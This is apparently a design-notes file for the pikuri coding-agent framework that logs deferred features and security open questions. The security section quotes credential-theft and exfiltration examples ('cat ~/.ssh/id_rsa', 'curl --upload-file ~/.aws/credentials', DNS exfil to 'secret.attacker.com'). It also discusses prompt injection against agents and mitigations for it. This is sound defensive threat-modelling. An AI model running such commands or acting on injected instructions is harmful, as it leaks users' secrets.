# IDEAS.md

Things pikuri considered, scoped, and deliberately deferred — recorded
here so a future contributor doesn't read the absence as oversight.
Promote into a real plan when the friction shows up.

Related but different: `COMPARISON.md` "Ideas to borrow" is the
externally-sourced version — "opencode/pi do X, should we?" This file
is the internally-sourced version — "we considered X for pikuri and
punted, here's why."

## Coding-agent deferrals

Carried over from the v1 plan once `bin/pikuri-code` shipped. Each was
in scope of the design exercise, considered, and left out on purpose.

- **Permission system.** opencode's three-action `allow` / `deny` /
  `ask` glob rules. v1 ships with two coarse modes (interactive
  `Workspace::Confirmer::TERMINAL` on `Write` / `Bash`; `--yolo` swaps in
  `AUTO_APPROVE`). Revisit once `bin/pikuri-code` has lived a while
  and we know where the friction is. Where things are headed:
  yolo-in-docker, or ClaudeCode's agentic review of the command + automatic approval/denial.
- **Image auto-resize in `Workspace::Read`.** Day-one image support
  refuses anything over 5 MB outright (see
  `lib/pikuri/workspace/read.rb`'s `MAX_IMAGE_BYTES`). PI auto-resizes
  to 2000×2000 with an image-processing dep; we punted on that
  trade-off — adds mini_magick / ruby-vips for one tool's
  ergonomics. Revisit if "Read screenshot.png" being denied on size
  becomes a common annoyance.
- **LSP tool.** opencode wires an LSP client for hover / definition /
  diagnostics. Big-ticket feature; deferred until there's a concrete
  use case beyond "opencode has one."
- **Streaming output from bash.** `Code::Bash` returns a single
  observation `String`. Live process output is meant to stay on the
  listener stream once we add a TUI; meanwhile callers bound wall time
  with coreutils' `timeout`.
- **Session persistence / resumable sub-agents.** opencode's `task`
  tool persists sub-sessions; `Tool::SubAgent` doesn't. Worth doing
  the day we have any other reason to introduce a session store.

## Security perspective

The committed model lives in [`SECURITY.md`](SECURITY.md): a
short code-trust baseline (pikuri + LLM trusted; project bash
sandboxed via Bubblewrap; MCP processes left to Docker), then the
load-bearing prompt-injection section (lethal trifecta broken by
privilege-separated sub-agents, MCP description injection caught
by `Mcp::Verifier`), three worked attacks, and explicit non-goals.
This section is the open-questions log — mitigations under
consideration, open observations, and prior-art notes that haven't
graduated yet.

Threat model scales with capability. `bin/pikuri-chat` today is
small surface (calculator + three stateless network-out tools, no
filesystem writes); `bin/pikuri-code` has the full
read/write/edit/bash kit and is where most of the below bites; an
eventual `bin/pikuri-assistant` with MCP-backed Gmail / Calendar /
Slack inherits both sets and adds the privacy-of-personal-data
axis.

### Trifecta — open mitigations beyond sub-agent separation

The structural defense (privilege-separated `RESEARCHER` and
`FILE_MINER` sub-agents) shipped and is documented in
[`SECURITY.md`](SECURITY.md) §"Prompt injection".

The biggest adjacent idea — a **structural trifecta detector** that
tags tools with their legs, unions them per agent (propagating across
sub-agents), and warns when an agent holds all three — has its own
long-form design note: [`ideas/trifecta-detector.md`](ideas/trifecta-detector.md).
Designed, not built. Shorter adjacent ideas still on the table:

- **Provenance tags around tool output** in the context render
  (untrusted-content markers). Cheap, partial — empirical
  question whether the model pays attention to
  `<untrusted>…</untrusted>` framing.
- **Private-context taint + egress levels** — the long-form
  runtime-enforcement design (coarse context taint on first private
  read; Sealed / Bounded / Off levels; `web_search` whitelisted by
  nature vs `fetch` exfil by nature):
  [`ideas/private-context-taint.md`](ideas/private-context-taint.md).
  Designed, not built.
- **Egress allowlist** for `fetch` / `bash` when in interactive
  mode (auto-deny non-allowlisted hosts, prompt for first-use
  additions). Gondolin's egress-proxy pattern (see
  [`COMPARISON.md`](COMPARISON.md) §"Prior art deep-dive") is the
  heavyweight structural version.
- Prompt injection inside skill descriptions? Skills are
  user-installed text; current stance ([`SECURITY.md`](SECURITY.md)
  §"Code trust" — skills bullet) is "user-vetted by definition."
  A `Mcp::Verifier`-shaped pass for skills would belt-and-braces
  it.
- Content-level defenses against `web_scrape` injection beyond
  persona separation (provenance tags are the obvious shape).

### Unsandboxed Bash modes

`Code::Bash::Sandbox::Bubblewrap` constrains `Bash` to the workspace's
readable/writable roots + an OS-runtime baseline, and is the default in
`bin/pikuri-code`. The residual concern is `--no-sandbox` / `--yolo`:
there `cat ~/.ssh/id_rsa`, `env | grep -i key`,
`curl --upload-file ~/.aws/credentials ...` all run as the user, and
the per-command Confirmer is the only line of defense (`--yolo`
disables that too). The help text says "use only with an outer
sandbox" but nothing enforces it. Worth considering: detect a
container / VM at boot and refuse `--no-sandbox` outside one, or at
least surface a louder warning than the current `LOGGER.warn`.

### Egress is broader than `web_search`

Anywhere bytes leave the box: `bash` → curl/scp/dns/`ping -p`;
`fetch` with attacker-chosen URL; `write` into a Dropbox / iCloud /
git-tracked directory; markdown images rendered by a chat host that
fetches them; error messages echoed back into follow-up turns; the
LLM provider itself when non-local. DNS exfil
(`nslookup secret.attacker.com`) is sneaky — 60+ bytes per query, and
most egress firewalls don't filter port 53.

### Typed transport classes (private vs public)

Classify each LLM-shaped transport instance (chat / embedder /
reranker) as `:private` or `:public` from its endpoint host, and let
`Pikuri::Agent.new` refuse to mix classes by default — the structural
replacement for today's click-through provider banner. Long-form
design note with the code sketch, the three load-bearing points, and
the sequencing plan: [`ideas/typed-transports.md`](ideas/typed-transports.md).
Designed, not built.

### MCP — open ergonomic / supply-chain questions

The committed MCP story is split across [`SECURITY.md`](SECURITY.md):
the §"Code trust" bullet covers the Docker-for-untrusted-process
recommendation (suggested, not automatic); §"Defense: MCP
description verification" covers the `Mcp::Verifier` pre-flight
scan, with user-curation as the first line of defense. Open:

- **Per-tool first-use consent** (opencode-style sticky approval)
  is probably the right ergonomics shape — first invocation of
  the Gmail-MCP fetch tool is also the first consent prompt.
  Composes with the skill-gated lazy-add design.
- **First-class "wrap MCP in Docker" option** would close the
  supply-chain gap without leaving containerization to the user.
  Hard part: the wrapped MCP's egress / LLM-endpoint reachability
  re-opens the trifecta inside the container, so the egress
  policy of the inner Docker becomes the new question.

### Confirmer as a first-class, last-line-of-defense control

The *role* — last-line-of-defense for the parent agent in
`bin/pikuri-code`, where structural defense has run out and the
human gate is what stops a poisoned context from leaking — is now
documented in [chapter 6 §"The human gate, and why fatigue is the
enemy"](docs/guide/06-security.md). The two requirements (bother the
human only on the genuinely consequential; be excellent when it does
fire) and the dependency on the rest of the kit carrying the routine
load are stated there.

The not-yet-shipped technical piece: `Confirmer#confirm?` today takes
a pre-baked prompt String it can only echo. To live up to the chapter
5 framing — "headline the consequence, not the 80-char `curl` pipe"
— the call needs **structured action context** (kind: write / bash /
fetch; target path or URL; egress destination; in/out of workspace),
so the seam can render the load-bearing presentation rather than
echoing whatever the caller built. Composes with the per-pattern
stickiness wishlist in §"Permission model needs granularity" below —
sticky rules key naturally on structured fields, badly on raw
strings.

### Permission model needs granularity

`Confirmer::TERMINAL` is binary today (approve / deny per call).
Real-world ergonomics push toward:

- Per-tool, per-pattern stickiness ("always allow `git status`",
  "always allow read under `./src/**`").
- Risk tiers — read light, write medium, bash heavy, unknown-host
  fetch heavy.
- Dry-run preview for `Bash` (echoed argv, no shell-metachar
  surprise).
- Time-bound approvals ("for this session only" — implicit on
  session boundaries).

Risk to weigh: every persisted approval is past-you trusting
future-you's judgment, which prompt injection can lean on.

### Output-size DoS and cost

A 50MB scraped page → context window blown → API cost spike or OOM in
the tokenizer. `max_steps` covers the loop-count axis; a per-tool
output-byte cap covers the per-step axis. `Bash` (head+tail truncation
via `OUTPUT_HEAD`/`OUTPUT_TAIL`), `Read` (`MAX_BYTES`), and `WebScrape`
each enforce their own cap; remaining gap is a uniform shape across
all tools and disk-spillover of overflow (PI/opencode prior art —
tempfile path returned to the LLM).

### Misc smaller things

- **Logging hygiene.** `Pikuri.logger_for` shouldn't log Authorization
  headers, request bodies, or full search queries (which are often
  sensitive themselves).
- **`URLCache` on disk.** Cached pages with embedded auth cookies or
  sensitive scrape results — disk encryption matters, backups matter.
- **TOCTOU.** Mostly theoretical for an interactive agent, but
  `Workspace::Filesystem`'s check-then-open isn't atomic on POSIX.
- **Sub-agent context leak.** A child given less context than the
  parent can still leak parent context that flows in via the parent's
  "task" prompt.

### Prior art: how PI and opencode handle this

The deep survey of PI's two isolation weights (the bubblewrap-only
`sandbox` extension and the heavier Gondolin micro-VM, with its
egress-proxy + secret-placeholder pattern) and opencode's
tree-sitter-backed `(permission, glob)` permission system — plus the
"worth borrowing" shortlist — now lives in
[`COMPARISON.md`](COMPARISON.md) §"Prior art deep-dive", alongside the
higher-level permission/sandboxing comparison it extends. Findings
reinforce pikuri's framing rather than contradict it: neither project
ships prompt-injection defenses, both cap tool output to a tempfile,
both validate sub-agent privilege separation as the right shape.

## Personas for `Tool::SubAgent`

**v1 shipped.** `Pikuri::Tool::SubAgent` is now persona-driven:
`c.allow_agent(persona)` registers a `Pikuri::Tool::SubAgent::Persona`
(name + description + `tool_names` + system prompt + `max_steps`),
the LLM-facing tool is renamed `agent` with required `name:` (enum
over registered persona names) + `task:` parameters, and an
`<available_agents>` snippet is appended to the system prompt
describing every registered persona. Sub-agent system prompts no
longer inherit from the parent (was the visible bug: "you are a
coding assistant" leaked into a child whose actual job was a focused
lookup); extensions no longer auto-propagate to sub-agents either.
The first bundled persona is `Pikuri::Tool::SubAgent::RESEARCHER`,
shipped in the separate `pikuri-subagents` gem alongside the
`bin/pikuri-minions` fan-out demo (web tools only, 20 steps, prompt
at `pikuri-subagents/prompts/persona-researcher.txt`). The
machinery (`Tool::SubAgent`, `Persona`, `Configurator#allow_agent`)
stays in pikuri-core; bundled `Persona` instances live in
pikuri-subagents so studying pikuri-core doesn't drag in the
persona concept on day one.

**Also shipped: `Pikuri::SubAgent::FILE_MINER`** — read-only fs recon
counterpart to `RESEARCHER`. `tool_names: %w[read grep glob]`, 30
steps, prompt at `pikuri-subagents/prompts/persona-file-miner.txt`,
wired into `bin/pikuri-code` alongside `RESEARCHER` via
`c.add_extension Pikuri::SubAgent::Extension.new(personas: [Pikuri::SubAgent::FILE_MINER, Pikuri::SubAgent::RESEARCHER])`
— the same privilege-separation argument extends to web content
(scraped pages / fetched URLs land in `RESEARCHER`'s context, which
has no `bash` / `write` / `edit` to hijack).
The persona constant references its tools by string name only — no
`require` of `pikuri-workspace` — so the gem stays decoupled (hosts
without `read`/`grep`/`glob` simply don't register it). Privilege-
separation argument is the load-bearing one: a coding agent reading
an untrusted file (vendored README, scraped doc, template repo)
through FILE_MINER can't act on a prompt injection inside it — no
`bash`, no `fetch`, no `write`, no `agent` recursion. Context-economy
is the secondary win.

**Also shipped: `Pikuri::Code::GIT_REPO_RESEARCHER`** — the
"clone-and-dig" persona, third in the lineup. Lives in
`pikuri-code` (not `pikuri-subagents`) because it's the first
persona that ships a tool other than the bundled
`pikuri-subagents` / `pikuri-workspace` surface: a new
`Pikuri::Code::GitClone` (HTTPS-only, shallow, no submodules,
wrapped in the same Bubblewrap sandbox `Bash` uses).
`tool_names: %w[git_clone read grep glob web_search web_scrape fetch]`,
30 steps, prompt at
`pikuri-code/prompts/persona-git-repo-researcher.txt`, wired into
`bin/pikuri-code` as the third entry of the persona list. The
distinguishing structural piece is `needs_temp_workspace: true` —
the persona is declarative-only; `SubAgentTool` owns the lifecycle
(mktmpdir + mint a `Workspace::Filesystem` rooted at the temp dir
+ tear it down at sub-agent close). Trifecta-wise the persona is
same shape as `RESEARCHER`: leg (a) is structurally near-zero
because the temp workspace is disjoint from the parent's
project_root (containment rejects out-of-bounds paths), so cloned
content cannot leave files for the parent's `read` to pick up.
This also partially delivers the "workspace modes" follow-up
below — the `readonly_with_temp` mode generalizes
`needs_temp_workspace` from one persona to a `Persona` field.

Reference shape converges with Claude Code's `subagent_type`,
opencode's `agents` map (`packages/opencode/src/agent/agent.ts:129-281`),
and PI's `subagent` agents
(`packages/coding-agent/examples/extensions/subagent/agents/`).

### Not yet shipped — follow-up work

**Workspace modes.** The persona record today has a narrow
`needs_temp_workspace:` boolean (used by
`GIT_REPO_RESEARCHER` — see above) but no broader
`workspace_mode:` field. File-miner and Researcher work fine on
`inherit` semantics — child reuses parent's `Filesystem`-bound tool
instances by reference, no reconstruction. The interesting modes
from the original proposal stay queued:

- `inherit` — current behavior; what's implicit when the field is
  absent.
- `readonly` — derived `Filesystem` where every parent root is
  readable, none writable. No clones, no extracts.
- `readonly_with_temp` — same plus a fresh `temp:` scratchpad as the
  only writable spot (git-clone / unzip / `mvn dependency:sources`).
  Generalizes `needs_temp_workspace: true` from a single-purpose
  boolean to a composable mode — `GIT_REPO_RESEARCHER` becomes the
  first user once this lands and stops being a special case.

Adding these means promoting `needs_temp_workspace:` to a
`workspace_mode:` enum on the `Persona` record (default
`:inherit`) and a
`Pikuri::Workspace::Filesystem.scoped_readonly_from(parent, with_temp:)`
primitive in `pikuri-workspace`. The fs-touching tools all take
`Filesystem` via constructor today, so the reconstruction is
mechanical — but `bash` would also need `Confirmer::AUTO_APPROVE`
in those modes (the user already approved by picking the persona;
every command still flows through `Event::ToolCall` for audit).
fs-readonly doesn't stop network exfil or fork bombs, so a
`sandbox:` frontmatter key composing with `Code::Bash::Sandbox::Bubblewrap`
is the eventual follow-up.

**Catalog / `.md` discovery.** The current shape ships personas as
Ruby constants (`Pikuri::Tool::SubAgent::RESEARCHER`); good enough
while we have one. Once we ship 3+ and users want to author their
own, the original proposal (Markdown + YAML frontmatter, discovery
under `.pikuri/personas/*.md` / `.claude/agents/*.md` / `.agents/personas/*.md`,
new `pikuri-personas` gem with `Catalog` + `Extension`) becomes the
natural next step. Tool-name validation flips from raise → WARN-and-prune
at that point so a persona referencing an unwired tool just disappears.

**Extension re-propagation.** Sub-agents no longer inherit extensions
(MCP / Skills). Two-phase `configure`/`bind` collapses to "called
once on the parent only." If a persona later needs MCP-backed tools,
the redesign starts from scratch — likely a Persona field declaring
which extensions the child also wires in, plus rebuilding the
two-phase split.

**Per-persona `model:`.** PI has cheap-model-for-cheap-tasks
(haiku for scout, sonnet for planner). Real efficiency win, requires
`ChatTransport` variations per sub-agent. Deferred.

**LLM-authored personas.** Originally floated and deferred; the
escape hatch (ship a `general` persona) still works if it ever
matters.

## Memory

Designed as a journey, not built. The full design conversation —
work-aid-first framing, prior art (Claude Code / opencode / PI /
hermes-agent), the v0 → v1-miner → v2-layered iteration, what to
skip, and the open questions — has its own long-form note:
[`ideas/memory.md`](ideas/memory.md). `pikuri-memory` ships
today only as a name-reservation placeholder (no library code).

## Vector DB / RAG

**v1 shipped** as `pikuri-vectordb` — local-corpus vector search +
agentic RAG, wired onto an `Agent` via `c.add_extension
Pikuri::VectorDb::Extension.new(backend:, source:)`. Per-piece
rationale lives in the gem's YARD headers and the inventory in
[`CLAUDE.md`](CLAUDE.md); only the deferrals stay here.

What landed against the original sketch:

- **Extension** registers `vectordb_search` (`Search`),
  `vectordb_read` (`Read`), and `vectordb_reindex` (`Reindex`) on the
  parent and nothing more — it does not index. `vectordb_read` pulls
  one indexed document into context in full by its `source` path
  (parent-document retrieval, below); it is inbound-only, so it does
  not add an egress leg in either the `pikuri-corpus` or
  `LIBRARIAN`-mediated wiring. Population is host policy: an explicit
  `indexer.index_if_empty!`, a `Watcher`, or leaving the corpus empty
  until the agent calls `vectordb_reindex` (what `pikuri-corpus`
  does). No system-prompt snippet — direct-call and `LIBRARIAN`-mediated
  modes coexist, so the host picks the framing in its own prompt.
- **Backend** — pure-Ruby `Backend::InMemory` cosine default (strict
  RAM, re-indexes every boot), thin Faraday `Backend::Chroma` for
  persistence (self-managed via `ChromaServer`), one `Backend`
  interface + `Backend::Result`.
- **Embedder** wraps `RubyLLM.embed`. **Reranker** is optional —
  `Reranker::LlamaServer` over `/v1/rerank` (+ `Reranker::Hit`),
  retrieve-then-rerank, falls back to vector-only top-k on outage.
  It shipped under `Pikuri::VectorDb::Reranker`, *not* the
  `Pikuri::Transport::Reranker` location the §"Typed transport
  classes" sketch assumed — that section's reranker reference is now
  stale.
- **Chunker::FixedWindow** (512/50) over `FileType.read_as_text`
  text (plain / Markdown / PDF), behind a `Tokenizer` seam
  (`CharHeuristic` default / `LlamaServer`).
- **Both trifecta defenses**: the no-egress posture — shipped as
  `bin/pikuri-corpus`, a single recall agent with no web tools, so
  it holds at most two trifecta legs (chapter 3's worked example) —
  and the privilege-separated `LIBRARIAN` persona for an agent that
  *does* have egress (opt-in via `SubAgent::Extension`, same
  precedent as `GIT_REPO_RESEARCHER`). The `LIBRARIAN` is bundled
  but not yet wired into a binary: a correct wiring (corpus reachable
  only via the sub-agent) needs persona-owned tools, since today
  sub-agent tools are a subset of the parent's — see
  `trifecta-detector.md`. Its worked home is `pikuri-assistant`
  (ch7). The corpus-is-the-threat argument and the Onyx-connector
  escalation now live in the gem's yardoc.

Sketch open-questions that v1 resolved: **Chroma client** → wrote
our own thin Faraday client (no `chroma-db` dep); **`InMemory`
persistence** → strict RAM (Chroma is right there for persistence);
**disk-spillover** → `Search` caps each result snippet
(`SNIPPET_LENGTH`), so the per-step cap landed from day one (uniform
tempfile spillover across all tools is still the cross-cutting item
in §"Output-size DoS and cost").

The three-model ops guidance (chat + embedder + reranker on one
router-mode `llama-server`) graduated out of this log into the
`docs/guide/` chapters.

### Deferred

- **Classic-RAG-as-listener.** Auto-inject relevant chunks at the
  start of each turn (no tool call) — hermes' prefetch shape (see
  [`ideas/memory.md`](ideas/memory.md) §"Prior art"). v1 ships
  agentic search only — fits the
  loop-agnostic ethos and the agent gets to refine queries. Add
  the listener variant if a concrete "the model forgot to search"
  pattern shows up.
- **Per-doc-type chunkers.** Markdown-heading-aware splitter,
  AST-aware code chunker, contextual chunking. All real quality
  wins, all separately scoped features. (Parent-document
  retrieval shipped instead as the `vectordb_read` tool — the
  agent reads the whole source document on a clean hit, rather
  than the chunker stitching parent context onto every chunk.)
- **Onyx as a separate gem.** Onyx is a product (UI + connector
  framework + scheduler), not a vector DB. If pikuri wants Google
  Drive / Slack / Jira RAG, the right shape is `pikuri-onyx` —
  a thin tool gem that calls a self-hosted Onyx's search API over
  HTTP. Same precedent as MCP: integrate with the protocol, don't
  reimplement it. Onyx's heavy operational footprint stays opt-in
  and out of pikuri-vectordb's scope.
- **Memory v2 growth tier integration.**
  [`ideas/memory.md`](ideas/memory.md)'s v2 needs an
  external semantic store; pikuri-vectordb is potentially the
  answer. Deliberately not optimized for that case in v1 — get
  RAG + agentic search shipped first, then re-investigate whether
  memory can ride the same primitive (probably with a separate
  collection rooted at `~/.pikuri/memory/`, fed by a different
  source pipeline). Revisit explicitly after v1 lands.
- **Configurable ignore rules.** `Indexer::DENYLIST` ships a fixed
  set (`.git`, `node_modules`, dot-files); `.gitignore`-shaped
  user-configurable skip rules defer until someone asks.
